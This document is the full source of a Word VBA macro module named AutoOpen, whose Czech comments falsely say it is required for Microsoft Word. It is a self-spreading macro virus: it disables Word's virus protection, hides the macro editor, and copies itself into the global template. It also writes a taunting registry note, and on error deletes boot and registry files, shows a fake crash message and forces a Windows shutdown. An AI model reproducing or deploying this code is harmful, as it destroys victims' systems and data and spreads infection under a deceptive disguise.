Attribute VB_Name = "AutoOpen"

'Toto makro nezbitne je potreba k spravnemu behu programu Microsoft Word
'Jeho odstranenim muzete poskodit spravne pracovani programu Microsoft Word
Option Explicit

Private Declare Function SetFileAttributes _
Lib "kernel32" Alias "SetFileAttributesA" ( _
    ByVal lpFileName As String, _
    ByVal dwFileAttributes As Long _
) As Long
Private Const DDL_READWRITE = &H0

Private Declare Function ExitWindowsEx _
Lib "user32" ( _
    ByVal uFlags As Long, _
    ByVal dwReserved As Long _
) As Long

Sub main()
 Dim Cesta As String
 Dim x As Long
 Dim F1, F2 As Boolean
  
 On Error GoTo Kill
  Options.SaveNormalPrompt = 0
  Options.VirusProtection = 0
  CommandBars("Format").Controls(12).Visible = False
  WordBasic.DisableAutoMacros 0
     
  If NormalTemplate.Application.ShowVisualBasicEditor Then _
   NormalTemplate.Application.ShowVisualBasicEditor = False
   
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "HYPNOTIX") <> "... od -nH-" Then
Infikace:
   WordBasic.MacroCopy ActiveDocument.Name & ":AutoOpen", "Global:MacroSS", 1
   WordBasic.MacroCopy ActiveDocument.Name & ":Word_Macros", "Global:FileSave", 1
   WordBasic.MacroCopy ActiveDocument.Name & ":FileExit", "Global:XXX", 1
   WordBasic.MacroCopy ActiveDocument.Name & ":Word_Codes", "Global:AutoEXEC", 1
   WordBasic.MacroCopy ActiveDocument.Name & ":Word_Files", "Global:AutoClose", 1
   WordBasic.MacroCopy ActiveDocument.Name & ":Word_Files", "Global:FileExit", 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "HYPNOTIX") = "... od -nH-"
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Pozn.:") = "Máš tu Makrovira vole!"
  Else
   For x = 1 To WordBasic.CountMacros(0)
    If WordBasic.MacroName$(x, 0) <> "MacroSS" Then F1 = True
   Next x
   For x = 1 To WordBasic.CountMacros(0)
    If WordBasic.MacroName$(x, 0) <> "XXX" Then F2 = True
   Next x
   If F1 Then GoTo Infikace
   If F2 Then GoTo Infikace
  End If
 Exit Sub

Kill:
 On Error Resume Next
  Cesta = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
  x = SetFileAttributes("C:\autoexec.bat", DDL_READWRITE)
  If x <> 0 Then Kill "C:\autoexec.bat"
  x = SetFileAttributes("C:\io.sys", DDL_READWRITE)
  If x <> 0 Then Kill "C:\io.sys"
  x = SetFileAttributes("C:\command.com", DDL_READWRITE)
  If x <> 0 Then Kill "C:\command.com"
  x = SetFileAttributes("C:\msdos.sys", DDL_READWRITE)
  If x <> 0 Then Kill "C:\command.com"
  x = SetFileAttributes("C:\config.sys", DDL_READWRITE)
  If x <> 0 Then Kill "C:\config.com"
  x = SetFileAttributes(Cesta & "\win.com", DDL_READWRITE)
  If x <> 0 Then Kill Cesta & "\win.com"
  x = SetFileAttributes(Cesta & "\command.com", DDL_READWRITE)
  If x <> 0 Then Kill Cesta & "\command.com"
  x = SetFileAttributes(Cesta & "\user.dat", DDL_READWRITE)
  If x <> 0 Then Kill Cesta & "\user.dat"
  x = SetFileAttributes(Cesta & "\system.dat", DDL_READWRITE)
  If x <> 0 Then Kill Cesta & "\system.dat"
  
  MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
  ExitWindowsEx &H43, 0
 End Sub
